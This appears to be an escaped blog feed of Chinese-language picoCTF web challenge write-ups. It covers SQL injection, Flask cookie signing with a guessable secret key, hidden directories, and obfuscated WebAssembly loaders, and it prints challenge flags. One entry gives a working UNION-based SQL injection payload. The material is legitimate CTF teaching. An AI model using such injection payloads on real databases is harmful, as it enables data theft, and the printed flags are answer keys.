+&lt;li>CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)&lt;/li>
+&lt;/ul>
+&lt;p>可以直接用前面同樣的方式找flag，觀察這個table只有兩個column，且一個column的type是int，另外一個是text，而第三個column就隨便填
+Payload: &lt;code>Algiers' union SELECT id,flag,1 FROM more_table; --&lt;/code>
+:::spoiler Screenshot
+&lt;img src="https://hackmd.io/_uploads/ryonEoIdn.png" alt="" />
+:::
+Flag: &lt;code>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Most Cookies</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---most-cookies/</guid><description>&lt;h1 id="picoctf---most-cookies">
+ PicoCTF - Most Cookies
+ &lt;a class="anchor" href="#picoctf---most-cookies">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://vocus.cc/article/634c1c7efd89780001237de9">Python Flask session 學習心得&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>在Flask將資料儲存在session這個object裡面時，可看成是儲存在client端，因為資料其實是存在web server，每次新增內容到session就會新增一個新的cookie(cryptographically-signed cookies)，並透過secret_key做簽章。需注意的是這所謂的「secret_key」並不是用於加密(切勿儲存機密資料)，而是用來做數位簽章確認資料的完整性，簡單說是每個人都可以知道cookie裡面的資料，但只有server知道cookie是否被串改，如果被串改就無法登入該帳戶。&lt;/p>&lt;/blockquote>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler Source Code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
+import random
+app = Flask(__name__)
+flag_value = open(&amp;#34;./flag&amp;#34;).read().rstrip()
+title = &amp;#34;Most Cookies&amp;#34;
+cookie_names = [&amp;#34;snickerdoodle&amp;#34;, &amp;#34;chocolate chip&amp;#34;, &amp;#34;oatmeal raisin&amp;#34;, &amp;#34;gingersnap&amp;#34;, &amp;#34;shortbread&amp;#34;, &amp;#34;peanut butter&amp;#34;, &amp;#34;whoopie pie&amp;#34;, &amp;#34;sugar&amp;#34;, &amp;#34;molasses&amp;#34;, &amp;#34;kiss&amp;#34;, &amp;#34;biscotti&amp;#34;, &amp;#34;butter&amp;#34;, &amp;#34;spritz&amp;#34;, &amp;#34;snowball&amp;#34;, &amp;#34;drop&amp;#34;, &amp;#34;thumbprint&amp;#34;, &amp;#34;pinwheel&amp;#34;, &amp;#34;wafer&amp;#34;, &amp;#34;macaroon&amp;#34;, &amp;#34;fortune&amp;#34;, &amp;#34;crinkle&amp;#34;, &amp;#34;icebox&amp;#34;, &amp;#34;gingerbread&amp;#34;, &amp;#34;tassie&amp;#34;, &amp;#34;lebkuchen&amp;#34;, &amp;#34;macaron&amp;#34;, &amp;#34;black and white&amp;#34;, &amp;#34;white chocolate macadamia&amp;#34;]
+app.secret_key = random.choice(cookie_names)
+
+@app.route(&amp;#34;/&amp;#34;)
+def main():
+	if session.get(&amp;#34;very_auth&amp;#34;):
+		check = session[&amp;#34;very_auth&amp;#34;]
+		if check == &amp;#34;blank&amp;#34;:
+			return render_template(&amp;#34;index.html&amp;#34;, title=title)
+		else:
+			return make_response(redirect(&amp;#34;/display&amp;#34;))
+	else:
+		resp = make_response(redirect(&amp;#34;/&amp;#34;))
+		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
+		return resp
+
+@app.route(&amp;#34;/search&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
+def search():
+	if &amp;#34;name&amp;#34; in request.form and request.form[&amp;#34;name&amp;#34;] in cookie_names:
+		resp = make_response(redirect(&amp;#34;/display&amp;#34;))
+		session[&amp;#34;very_auth&amp;#34;] = request.form[&amp;#34;name&amp;#34;]
+		return resp
+	else:
+		message = &amp;#34;That doesn&amp;#39;t appear to be a valid cookie.&amp;#34;
+		category = &amp;#34;danger&amp;#34;
+		flash(message, category)
+		resp = make_response(redirect(&amp;#34;/&amp;#34;))
+		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
+		return resp
+
+@app.route(&amp;#34;/reset&amp;#34;)
+def reset():
+	resp = make_response(redirect(&amp;#34;/&amp;#34;))
+	session.pop(&amp;#34;very_auth&amp;#34;, None)
+	return resp
+
+@app.route(&amp;#34;/display&amp;#34;, methods=[&amp;#34;GET&amp;#34;])
+def flag():
+	if session.get(&amp;#34;very_auth&amp;#34;):
+		check = session[&amp;#34;very_auth&amp;#34;]
+		if check == &amp;#34;admin&amp;#34;:
+			resp = make_response(render_template(&amp;#34;flag.html&amp;#34;, value=flag_value, title=title))
+			return resp
+		flash(&amp;#34;That is a cookie! Not very special though...&amp;#34;, &amp;#34;success&amp;#34;)
+		return render_template(&amp;#34;not-flag.html&amp;#34;, title=title, cookie_name=session[&amp;#34;very_auth&amp;#34;])
+	else:
+		resp = make_response(redirect(&amp;#34;/&amp;#34;))
+		session[&amp;#34;very_auth&amp;#34;] = &amp;#34;blank&amp;#34;
+		return resp
+
+if __name__ == &amp;#34;__main__&amp;#34;:
+	app.run()
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</guid><description>&lt;h1 id="picoctf---notepad">
+ PicoCTF - notepad
+ &lt;a class="anchor" href="#picoctf---notepad">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://hackmd.io/@shaoeChen/BkApyHhgf?type=view">Flask實作_基礎_03_簡述url_for與route&lt;/a>
+&lt;a href="https://tedboy.github.io/flask/generated/werkzeug.url_fix.html">werkzeug.url_fix&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>PicoCTF - Scavenger Hunt</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---scavenger-hunt/</guid><description>&lt;h1 id="picoctf---scavenger-hunt">
+ PicoCTF - Scavenger Hunt
+ &lt;a class="anchor" href="#picoctf---scavenger-hunt">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://mercury.picoctf.net:55079/">Scavenger Hunt&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://icodding.blogspot.com/2015/10/htaccess.html">.htaccess 使用技巧彙整&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>.htaccess文件(或者」分佈式配置文件」）提供了針對目錄改變配置的方法， 即，在一個特定的文件目錄中放置一個包含一個或多個指令的文件， 以作用於此目錄及其所有子目錄。作為用戶，所能使用的命令受到限制。管理員可以通過Apache的AllowOverride指令來設置。
+概述來說，htaccess文件是Apache伺服器中的一個配置文件，它負責相關目錄下的網頁配置。通過htaccess文件，可以幫我們實現：網頁301重定向、自定義404錯誤頁面、改變文件擴展名、允許/阻止特定的用戶或者目錄的訪問、禁止目錄列表、配置預設文件等功能。
+.htaccess 詳解&lt;/p>&lt;/blockquote>
+&lt;h2 id="exploit---insp3ct0r--htaccess--ds_store">
+ Exploit - &lt;a href="https://bernie6401.github.io/gYsHjI-rSD6Lce-7eF6DyA">Insp3ct0r&lt;/a> + &lt;code>htaccess&lt;/code> + &lt;code>DS_Store&lt;/code>
+ &lt;a class="anchor" href="#exploit---insp3ct0r--htaccess--ds_store">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>HTML + CSS +JS
+These files keeps one fragment flag each. Especially &lt;code>js&lt;/code> file&amp;rsquo;s hint: &lt;code>/* How can I keep Google from indexing my website? */&lt;/code>
+&lt;img src="https://i.imgur.com/wuX9KLT.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Apache server $\to$ &lt;code>.htaccess&lt;/code> file
+&lt;img src="https://i.imgur.com/li2z8l4.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Mac computer $\to$ &lt;code>.DS_Store&lt;/code> file
+&lt;img src="https://i.imgur.com/iZfLWZ3.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - Secrets</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---secrets/</guid><description>&lt;h1 id="picoctf---secrets">
+ PicoCTF - Secrets
+ &lt;a class="anchor" href="#picoctf---secrets">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Description: We have several pages hidden. Can you find the one with the flag?&lt;/li>
+&lt;li>Hint: folders folders folders&lt;/li>
+&lt;/ul>
+&lt;p>這一題也是蠻有趣的&lt;/p>
+&lt;h2 id="exploit---通靈">
+ Exploit - &lt;font color="FF0000">通靈&lt;/font>
+ &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>首先看一下網頁的source code，沒什麼特別的地方，但有看到&lt;code>secret/assets/index.css&lt;/code>，所以有一個route是secrets，試看看有甚麼東西
+&lt;img src="https://hackmd.io/_uploads/HywRa08_n.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>發現這樣的想法是對的，陸續看一下source code有甚麼其他route，就繼續加在URL就對了
+&lt;img src="https://hackmd.io/_uploads/HyumC0U_2.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>Payload: &lt;code>view-source:http://saturn.picoctf.net:65352/secret/hidden/superhidden/&lt;/code>
+Flag: &lt;code>picoCTF{succ3ss_@h3n1c@10n_790d2615}&lt;/code>&lt;/p>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/40DYCMInk5E"> secrets | picoCTF 2022 &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-1/</guid><description>&lt;h1 id="picoctf---some-assembly-required-1">
+ PicoCTF - Some Assembly Required 1
+ &lt;a class="anchor" href="#picoctf---some-assembly-required-1">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/152?category=1&amp;amp;page=1">Some Assembly Required 1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://blog.techbridge.cc/2017/06/17/webassembly-js-future/">了解 WebAssembly 的基礎使用方法&lt;/a>&lt;/p>
+&lt;h2 id="source-code---after-beautify">
+ Source code - After &lt;a href="https://beautifier.io/">Beautify&lt;/a>
+ &lt;a class="anchor" href="#source-code---after-beautify">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler source code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const strings = [&amp;#39;value&amp;#39;, &amp;#39;2wfTpTR&amp;#39;, &amp;#39;instantiate&amp;#39;, &amp;#39;275341bEPcme&amp;#39;, &amp;#39;innerHTML&amp;#39;, &amp;#39;1195047NznhZg&amp;#39;, &amp;#39;1qfevql&amp;#39;, &amp;#39;input&amp;#39;, &amp;#39;1699808QuoWhA&amp;#39;, &amp;#39;Correct!&amp;#39;, &amp;#39;check_flag&amp;#39;, &amp;#39;Incorrect!&amp;#39;, &amp;#39;./JIFxzHyW8W&amp;#39;, &amp;#39;23SMpAuA&amp;#39;, &amp;#39;802698XOMSrr&amp;#39;, &amp;#39;charCodeAt&amp;#39;, &amp;#39;474547vVoGDO&amp;#39;, &amp;#39;getElementById&amp;#39;, &amp;#39;instance&amp;#39;, &amp;#39;copy_char&amp;#39;, &amp;#39;43591XxcWUl&amp;#39;, &amp;#39;504454llVtzW&amp;#39;, &amp;#39;arrayBuffer&amp;#39;, &amp;#39;2NIQmVj&amp;#39;, &amp;#39;result&amp;#39;];
+
+const search_string1 = function(id1, _0x53c021) {
+ id1 = id1 - 470;
+ let strings6f = strings[id1];
+ return strings6f;
+};
+
+(function(id1, id2) {
+ const search_string = search_string1;
+ while (!![]) {
+ try {
+ const secret_key = -parseInt(search_string(0x1eb)) + parseInt(search_string(0x1ed)) + -parseInt(search_string(0x1db)) * -parseInt(search_string(0x1d9)) + -parseInt(search_string(0x1e2)) * -parseInt(search_string(0x1e3)) + -parseInt(search_string(0x1de)) * parseInt(search_string(0x1e0)) + parseInt(search_string(0x1d8)) * parseInt(search_string(0x1ea)) + -parseInt(search_string(0x1e5));
+ if (secret_key === id2) break;
+ else id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
+ } catch (_0x41d31a) {
+ id1[&amp;#39;push&amp;#39;](id1[&amp;#39;shift&amp;#39;]());
+ }
+ }
+}(strings, 627907));
+let exports;
+(async () =&amp;gt; {
+ const search_string = search_string1;
+ let _0x5f0229 = await fetch(search_string(489)),
+ _0x1d99e9 = await WebAssembly[search_string(479)](await _0x5f0229[search_string(474)]()),
+ _0x1f8628 = _0x1d99e9[search_string(470)];
+ exports = _0x1f8628[&amp;#39;exports&amp;#39;];
+})();
+
+function onButtonPress() {
+ const search_string = search_string1;
+ let input_value = document[&amp;#39;getElementById&amp;#39;](search_string(484))[search_string(477)]; // document[&amp;#39;getElementById&amp;#39;](input)[value]
+ for (let i = 0; i &amp;lt; input_value[&amp;#39;length&amp;#39;]; i++) {
+ exports[search_string(471)](input_value[search_string(492)](i), i);
+ }
+ exports[&amp;#39;copy_char&amp;#39;](0, input_value[&amp;#39;length&amp;#39;]), exports[search_string(487)]() == 1 ? document[search_string(494)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e6) : document[search_string(0x1ee)](search_string(0x1dc))[search_string(0x1e1)] = search_string(0x1e8);
+}
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Some Assembly Required 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---some-assembly-required-2/</guid><description>&lt;h1 id="picoctf---some-assembly-required-2">
+ PicoCTF - Some Assembly Required 2
+ &lt;a class="anchor" href="#picoctf---some-assembly-required-2">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-picoctf-ctf-web">
+ tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler source&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;copy_char&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;value&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;207aLjBod&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1301420SaUSqf&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;233ZRpipt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;2224QffgXU&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;check_flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;408533hsoVYx&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;instance&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;278338GVFUrH&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Correct!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;549933ZVjkwI&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;innerHTML&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;charCodeAt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;./aD8SvhyVkb&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;result&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;977AzKzwq&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Incorrect!&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;exports&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;getElementById&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;1jIrMBu&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;input&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;615361geljRK&amp;#39;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">195&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">list_str&lt;/span>[&lt;span style="color:#a6e22e">var_a&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">list_strc4&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">var_a&lt;/span>, &lt;span style="color:#a6e22e">var_b&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#f92672">!!&lt;/span>[]) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">200&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">201&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">205&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">207&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">195&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">198&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">212&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">203&lt;/span>)) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">217&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> parseInt(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">199&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">var_c&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">var_b&lt;/span>) &lt;span style="color:#66d9ef">break&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (&lt;span style="color:#a6e22e">_0x4f8a&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;push&amp;#39;&lt;/span>](&lt;span style="color:#a6e22e">var_a&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;shift&amp;#39;&lt;/span>]());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}(&lt;span style="color:#a6e22e">list_str&lt;/span>, &lt;span style="color:#ae81ff">310022&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">exports&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&lt;span style="color:#66d9ef">async&lt;/span> () =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">210&lt;/span>)),
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">WebAssembly&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;instantiate&amp;#39;&lt;/span>](&lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;arrayBuffer&amp;#39;&lt;/span>]()),
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res_3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_2&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">204&lt;/span>)];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exports&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">res_3&lt;/span>[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">214&lt;/span>)];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">onButtonPress&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">func1_cal&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">216&lt;/span>)](&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">218&lt;/span>))[&lt;span style="color:#a6e22e">func1_cal&lt;/span>(&lt;span style="color:#ae81ff">197&lt;/span>)];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; &lt;span style="color:#a6e22e">idx&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">res_1&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;length&amp;#39;&lt;/span>]; &lt;span style="color:#a6e22e">idx&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) {
